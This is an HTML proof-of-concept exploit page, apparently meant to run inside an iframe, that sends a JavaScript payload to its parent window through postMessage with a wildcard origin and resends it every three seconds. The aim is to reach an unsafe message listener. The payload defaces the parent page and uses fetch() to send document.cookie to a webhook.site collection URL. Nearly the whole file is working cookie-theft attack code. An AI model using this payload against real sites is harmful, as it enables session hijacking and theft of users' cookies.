<!DOCTYPE html>
<html>
<head>
  <title>PoC: iframe attack via postMessage</title>
</head>
<body>
  <h1>PoC: Sending raw JS payload via postMessage</h1>

  <script>
    const payload = `
      console.log('🔥 Executed from child iframe');
      document.body.innerHTML += '<h1 style="color:red">Exploit Successful 🔥</h1>';
      fetch('https://webhook.site/xxx?cookie=' + encodeURIComponent(document.cookie));
    `;

    const message = {
      type: "exploit-payload",
      payload: payload,
      origin: location.origin,
      time: new Date().toISOString()
    };

    console.log("📤 Sending payload to parent window...");
    window.parent.postMessage(payload, "*");

    // إعادة الإرسال كل ثواني قليلة لمحاولة اختراق event listener في parent
    setInterval(() => {
      window.parent.postMessage(payload, "*");
    }, 3000);
  </script>
</body>
</html>
